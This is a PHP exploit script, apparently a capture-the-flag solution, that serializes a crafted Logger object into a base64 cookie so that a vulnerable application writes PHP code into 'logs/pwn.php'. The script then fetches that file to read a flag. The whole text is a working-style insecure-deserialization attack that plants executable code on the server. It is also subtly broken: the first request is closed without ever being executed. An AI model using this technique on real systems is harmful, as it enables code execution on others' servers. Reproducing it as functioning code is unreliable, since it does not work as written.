<?php

class Logger {
  protected $initMessage;
  protected $logFile;
  protected $endMessage;

  public function __construct() {
    $this->initMessage = "";
    $this->logFile = "logs/pwn.php";
    $this->endMessage = "<?php echo file_get_contents('../.htflag');";
  }

  public function getLogFile() {
    return $this->logFile;
  }
}

$l = new Logger();

$order = base64_encode(serialize($l));

echo "Payload:\norder={$order}\n";


// Auto-fetch
$target = 'http://2.vulnerable.local';

// Exploit the application
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $target);
curl_setopt($curl, CURLOPT_HTTPHEADER, array("Cookie: order={$order}"));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, false);
curl_close($curl);

// Get the flag
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $target . '/' . $l->getLogFile());
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($curl);
curl_close($curl);

echo "\n\n -- Flag: ", $content, "\n\n";
